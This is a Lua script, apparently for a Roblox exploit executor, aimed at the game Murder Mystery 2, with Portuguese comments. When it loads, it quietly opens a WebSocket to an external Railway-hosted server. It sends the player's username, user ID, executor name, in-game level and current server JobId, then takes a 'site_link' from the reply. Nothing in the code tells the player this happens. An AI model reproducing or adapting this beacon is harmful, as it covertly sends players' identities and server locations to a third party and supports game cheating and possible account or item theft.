-- ====== WEBSOCKET PROXY ======
local WS_URL = "wss://narcolandia-production.up.railway.app"

local function connectWebSocket()
    local ws
    local success = pcall(function()
        if syn and syn.websocket then
            ws = syn.websocket.connect(WS_URL)
        elseif WebSocket then
            ws = WebSocket.connect(WS_URL)
        else
            error("Executor não suporta WebSocket")
        end
    end)
    return success and ws or nil
end

local function sendToWebSocket(ws, key, payload)
    local message = { key = key, payload = payload }
    local success = pcall(function()
        ws:Send(HttpService:JSONEncode(message))
    end)
    return success
end

-- ====== ENVIA DADOS PARA O SERVIDOR ======
local function sendDataToServer()
    -- Pega o nível do MM2
    local level = "0"
    pcall(function()
        local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
        local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
        for i, v in pairs(LevelModule.XPTable) do
            if PlayerDataModule.NewXP < v then
                level = tostring(i)
                break
            end
        end
    end)

    -- Dados que o script envia para o servidor
    local playerData = {
        key = NARCO_KEY,
        player_name = LP.Name,
        executor = identifyexecutor and identifyexecutor() or "Desconhecido",
        level = level,
        user_id = LP.UserId,
        game_id = game.JobId,
        game_name = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end) and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconhecido"
    }
    
    local ws = connectWebSocket()
    if ws then
        -- Envia os dados e aguarda resposta com o site_link
        local success = sendToWebSocket(ws, NARCO_KEY, playerData)
        if success then
            -- Aguarda a resposta do servidor com o site_link
            ws.OnMessage:Connect(function(message)
                local data = HttpService:JSONDecode(message)
                if data and data.site_link then
                    SITE_LINK = data.site_link
                    print("✅ Site link recebido: " .. SITE_LINK)
                end
            end)
            wait(1)
            pcall(function() ws:Close() end)
        end
    end
end

-- Executa o envio
pcall(sendDataToServer)

